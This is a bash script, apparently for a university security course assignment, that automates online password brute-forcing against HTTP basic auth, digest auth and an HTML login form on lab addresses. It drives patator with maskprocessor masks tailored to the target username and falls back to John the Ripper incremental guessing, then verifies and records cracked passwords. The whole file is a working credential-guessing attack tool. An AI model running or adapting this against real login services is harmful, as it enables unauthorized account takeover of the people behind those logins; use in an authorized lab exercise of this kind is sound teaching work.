#!/bin/bash
# CS660 Project 3 - Online Attack Automation Script
# Strategic password cracking for authorized penetration testing

set -euo pipefail

# Configuration
BASIC_URL="http://192.168.100.103/basicauth"
DIGEST_URL="http://192.168.100.103/digestauth" 
HTML_URL="http://192.168.100.101/login.html"
USERNAME="wangxx"
RATE_LIMIT="0.2"
THREADS="1"

# Evidence directory
EVIDENCE_DIR="evidence"
mkdir -p "$EVIDENCE_DIR"

# Logging function
log_command() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $*" | tee -a "$EVIDENCE_DIR/COMMANDS.log"
}

# Tool version logging
log_tool_versions() {
    log_command "=== TOOL VERSIONS ==="
    log_command "patator version: $(patator --version 2>/dev/null || echo 'unknown')"
    log_command "john version: $(john --version 2>/dev/null | head -1 || echo 'unknown')"
    log_command "mp64 version: $(mp64 --version 2>/dev/null || echo 'unknown')"
    log_command "curl version: $(curl --version | head -1)"
}

# Tool installation check
check_tools() {
    log_command "Checking required tools..."
    
    local missing=0
    
    if ! command -v patator &> /dev/null; then
        log_command "ERROR: patator not found. Install with: apt install patator"
        missing=1
    fi
    
    if ! command -v mp64 &> /dev/null; then
        log_command "WARNING: mp64 not found. Trying alternative names..."
        if ! command -v maskprocessor &> /dev/null; then
            log_command "ERROR: maskprocessor/mp64 not found. Install hashcat-utils or maskprocessor"
            missing=1
        else
            # Create mp64 alias for maskprocessor
            log_command "Using maskprocessor as mp64"
            alias mp64=maskprocessor
        fi
    fi
    
    if ! command -v john &> /dev/null; then
        log_command "ERROR: john not found. Install with: apt install john"
        missing=1
    fi
    
    if [[ $missing -eq 1 ]]; then
        log_command "ERROR: Missing required tools. Exiting."
        exit 1
    fi
    
    log_command "All required tools available"
    log_tool_versions
}

# Network connectivity check
check_connectivity() {
    log_command "Checking target connectivity..."
    
    for url in "$BASIC_URL" "$DIGEST_URL" "$HTML_URL"; do
        if ! curl -s --connect-timeout 5 "$url" > /dev/null; then
            log_command "ERROR: Cannot reach $url"
            exit 1
        fi
    done
    
    log_command "All targets reachable"
}

# Verification function
verify_success() {
    local auth_type="$1"
    local password="$2"
    local evidence_file="$3"
    
    log_command "Verifying success for $auth_type with password: $password"
    
    case "$auth_type" in
        "basic")
            curl -i -u "$USERNAME:$password" "$BASIC_URL" > "$evidence_file" 2>&1
            ;;
        "digest")
            curl -i -u "$USERNAME:$password" "$DIGEST_URL" > "$evidence_file" 2>&1
            ;;
        "html")
            curl -i -c "$EVIDENCE_DIR/cookies.txt" \
                -d "httpd_username=$USERNAME&httpd_password=$password" \
                "$HTML_URL" > "$evidence_file" 2>&1
            ;;
    esac
    
    log_command "Evidence saved to $evidence_file"
    
    # Check if verification was successful
    if grep -q "200 OK\|Congratulations" "$evidence_file"; then
        return 0
    else
        return 1
    fi
}

# Mask attack function
run_mask_attack() {
    local target="$1"
    local mask="$2"
    local auth_type="$3"
    local url="$4"
    local log_file="$5"
    
    log_command "Starting mask attack: $target with mask: $mask"
    
    local cmd
    case "$auth_type" in
        "basic"|"digest")
            cmd="patator http_fuzz url=$url auth_type=$auth_type user=$USERNAME password=PROG0 0=\"mp64 $mask\" -x ignore:code=401 --rate-limit $RATE_LIMIT -t $THREADS"
            ;;
        "html")
            cmd="patator http_fuzz url=$url method=POST follow=1 body='httpd_username=$USERNAME&httpd_password=PROG0' 0=\"mp64 $mask\" -x ignore:fgrep='Invalid' -x quit:fgrep='Congratulations' --rate-limit $RATE_LIMIT -t $THREADS"
            ;;
    esac
    
    log_command "Executing: $cmd"
    
    # Run with timeout to prevent hanging and redirect output to log
    timeout 300 bash -c "$cmd" > "$log_file" 2>&1 || {
        local exit_code=$?
        if [[ $exit_code -eq 124 ]]; then
            log_command "Mask attack timed out after 5 minutes: $mask"
        else
            log_command "Mask attack failed with exit code $exit_code: $mask"
        fi
        return 1
    }
}

# John incremental attack function
run_john_attack() {
    local target="$1"
    local auth_type="$2" 
    local url="$3"
    local log_file="$4"
    local min_len="$5"
    local max_len="$6"
    
    log_command "Starting John incremental attack: $target (length: $min_len-$max_len)"
    
    local cmd
    case "$auth_type" in
        "basic"|"digest")
            cmd="patator http_fuzz url=$url auth_type=$auth_type user=$USERNAME password=PROG0 0=\"john --stdout --incremental=ASCII --min-len=$min_len --max-len=$max_len\" -x ignore:code=401 --rate-limit $RATE_LIMIT -t $THREADS"
            ;;
        "html")
            cmd="patator http_fuzz url=$url method=POST follow=1 body='httpd_username=$USERNAME&httpd_password=PROG0' 0=\"john --stdout --incremental=ASCII --min-len=$min_len --max-len=$max_len\" -x ignore:fgrep='Invalid' -x quit:fgrep='Congratulations' --rate-limit $RATE_LIMIT -t $THREADS"
            ;;
    esac
    
    log_command "Executing: $cmd"
    
    # Run with timeout and redirect output to log
    timeout 1800 bash -c "$cmd" > "$log_file" 2>&1 || {
        local exit_code=$?
        if [[ $exit_code -eq 124 ]]; then
            log_command "John attack timed out after 30 minutes"
        else
            log_command "John attack failed with exit code $exit_code"
        fi
        return 1
    }
}

# Check for success in log file
check_success() {
    local log_file="$1"
    
    if [[ ! -f "$log_file" ]]; then
        return 1
    fi
    
    # Look for successful responses in log (Patator doesn't use JSON by default)
    if grep -q "200\|Congratulations" "$log_file" 2>/dev/null; then
        # Extract the successful password from the line
        local success_line=$(grep -E "200|Congratulations" "$log_file" | tail -1)
        # Extract password from Patator output format
        echo "$success_line" | awk '{print $2}' | cut -d':' -f2
        return 0
    fi
    
    return 1
}

# Attack target function
attack_target() {
    local target="$1"
    local auth_type="$2"
    local url="$3"
    local char_limit="$4"
    local masks=("${@:5}")
    
    log_command "=== ATTACKING $target ($auth_type, $char_limit chars) ==="
    
    local log_file="$EVIDENCE_DIR/${target}_patator.log"
    local evidence_file="$EVIDENCE_DIR/${target}_success.txt"
    
    # Skip if already successful
    if [[ -f "$evidence_file" ]]; then
        log_command "$target already successfully attacked. Skipping."
        return 0
    fi
    
    # Try biased masks first
    for mask in "${masks[@]}"; do
        log_command "Trying mask: $mask"
        
        if run_mask_attack "$target" "$mask" "$auth_type" "$url" "$log_file"; then
            local password
            if password=$(check_success "$log_file"); then
                log_command "SUCCESS! Found password: $password"
                
                if verify_success "$auth_type" "$password" "$evidence_file"; then
                    log_command "Verification successful for $target"
                    echo "| $target | $password | mp64 mask: $mask | SUCCESS |" >> "$EVIDENCE_DIR/online_attack_results.md"
                    return 0
                else
                    log_command "Verification failed for $target"
                fi
            fi
        fi
        
        # Small delay between attempts
        sleep 2
    done
    
    # Fall back to John incremental if masks fail
    log_command "Mask attacks failed. Trying John incremental..."
    
    if run_john_attack "$target" "$auth_type" "$url" "$log_file" "$char_limit" "$char_limit"; then
        local password
        if password=$(check_success "$log_file"); then
            log_command "SUCCESS! Found password with John: $password"
            
            if verify_success "$auth_type" "$password" "$evidence_file"; then
                log_command "Verification successful for $target"
                echo "| $target | $password | john --incremental=ASCII | SUCCESS |" >> "$EVIDENCE_DIR/online_attack_results.md"
                return 0
            else
                log_command "Verification failed for $target"
            fi
        fi
    fi
    
    log_command "All attacks failed for $target"
    echo "| $target | N/A | All methods | FAILED |" >> "$EVIDENCE_DIR/online_attack_results.md"
    return 1
}

# Main execution
main() {
    log_command "=== CS660 ONLINE ATTACK AUTOMATION STARTED ==="
    log_command "Start time: $(date)"
    
    # Setup
    check_tools
    check_connectivity
    
    # Create results table header
    cat > "$EVIDENCE_DIR/online_attack_results.md" << 'EOF'
# Online Attack Results

| Target | Password | Method | Status |
|--------|----------|--------|---------|
EOF
    
    local success=0
    
    # Basic Auth (8 chars, alphanumeric)
    local basic_masks=(
        "Wang?d?d?d?d"
        "wang?d?d?d?d"  
        "JMU?d?d?d?d?d"
        "jmu?d?d?d?d?d"
        "CS660?d?d"
        "cs660?d?d"
        "Fall20?d?d"
        "fall20?d?d"
        "Admin?d?d?d"
        "admin?d?d?d"
        "?l?l?l?l?d?d?d?d"
        "?u?l?l?l?d?d?d?d"
    )
    
    if attack_target "basic" "basic" "$BASIC_URL" 8 "${basic_masks[@]}"; then
        success=1
    fi
    
    # Digest Auth (6 chars, alphanumeric) 
    local digest_masks=(
        "wx?d?d?d?d"
        "cs?d?d?d?d"
        "jmu?d?d?d"
        "CS?d?d?d?d"
        "JMU?d?d?d"
        "?l?l?d?d?d?d"
        "?l?l?l?d?d?d"
        "?u?l?l?d?d?d"
    )
    
    if attack_target "digest" "digest" "$DIGEST_URL" 6 "${digest_masks[@]}"; then
        success=1
    fi
    
    # HTML Form (8 chars, alphanumeric)
    local html_masks=(
        "Wang?d?d?d?d"
        "wang?d?d?d?d"
        "JMU?d?d?d?d?d"
        "jmu?d?d?d?d?d"
        "CS660?d?d"
        "cs660?d?d"
        "Fall20?d?d"
        "fall20?d?d"
        "Admin?d?d?d"
        "admin?d?d?d"
        "?l?l?l?l?d?d?d?d"
        "?u?l?l?l?d?d?d?d"
    )
    
    if attack_target "html" "html" "$HTML_URL" 8 "${html_masks[@]}"; then
        success=1
    fi
    
    # Final summary
    log_command "=== ONLINE ATTACK AUTOMATION COMPLETED ==="
    log_command "End time: $(date)"
    
    if [[ $success -eq 1 ]]; then
        log_command "SUCCESS: At least one password was found!"
        log_command "Check evidence/ directory for proof files"
        log_command "Results table saved to: $EVIDENCE_DIR/online_attack_results.md"
        exit 0
    else
        log_command "FAILURE: No passwords found"
        exit 1
    fi
}

# Signal handling for clean exit
trap 'log_command "Script interrupted by user"; exit 130' INT TERM

# Run main function
main "$@"